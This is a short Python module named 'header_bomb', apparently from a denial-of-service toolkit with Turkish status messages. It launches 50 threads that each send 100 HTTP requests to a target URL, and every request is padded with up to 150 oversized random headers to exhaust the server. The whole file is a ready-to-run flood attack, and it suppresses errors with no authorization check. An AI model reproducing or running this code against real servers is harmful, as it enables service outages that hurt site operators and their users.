# modules/header_bomb.py

import threading
import requests
import random
import string

def random_headers():
    headers = {
        "User-Agent": "StressBot/1.0",
        "Accept": "*/*"
    }
    for i in range(random.randint(50, 150)):
        key = f"X-Fake-{i}"
        val = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(100, 500)))
        headers[key] = val
    return headers

def attack(target, count):
    for _ in range(count):
        try:
            headers = random_headers()
            requests.get(target, headers=headers, timeout=5)
        except:
            pass

def run(target, threads=50, requests_per_thread=100):
    print("[*] Başlatılıyor: Header Bombası")
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack, args=(target, requests_per_thread))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()
    print("[+] Tamamlandı: Header Bombası")
